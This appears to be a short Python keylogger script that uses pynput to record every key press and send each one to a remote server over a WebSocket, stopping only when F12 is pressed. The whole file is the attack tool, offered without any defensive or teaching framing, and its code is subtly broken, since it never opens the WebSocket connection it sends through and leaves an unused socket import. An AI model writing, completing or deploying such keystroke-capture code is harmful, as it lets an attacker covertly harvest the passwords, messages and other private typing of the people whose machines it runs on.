import pynput.keyboard
import socket
import websocket

def on_press(key):
    key = str(key)
    key = key.replace("'", "")
    if key == "Key.f12":
        raise SystemExit(0)

    # Send key press data to the server via WebSocket
    websocket.send(key)

with pynput.keyboard.Listener(on_press=on_press) as listener:
    listener.join()